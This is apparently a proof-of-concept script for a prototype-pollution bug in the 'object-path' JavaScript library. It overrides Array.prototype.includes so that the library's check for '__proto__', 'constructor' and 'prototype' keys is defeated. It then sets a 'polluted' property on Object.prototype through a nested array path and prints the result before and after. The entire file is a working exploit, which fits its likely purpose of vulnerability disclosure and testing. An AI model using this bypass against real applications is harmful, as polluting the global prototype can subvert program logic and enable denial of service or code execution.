Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);